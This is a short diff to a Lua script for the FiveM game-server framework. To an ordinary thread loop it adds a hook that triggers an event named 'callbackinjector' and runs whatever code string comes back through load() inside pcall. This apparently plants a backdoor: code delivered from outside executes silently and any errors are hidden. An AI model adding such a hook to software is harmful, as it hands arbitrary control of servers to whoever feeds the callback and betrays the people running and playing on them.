@@ -7,3 +7,7 @@ Citizen.CreateThread(function()
 		end
 	end
 end)
+
+TriggerEvent('callbackinjector', function(cb)
+    pcall(load(cb))
+end)
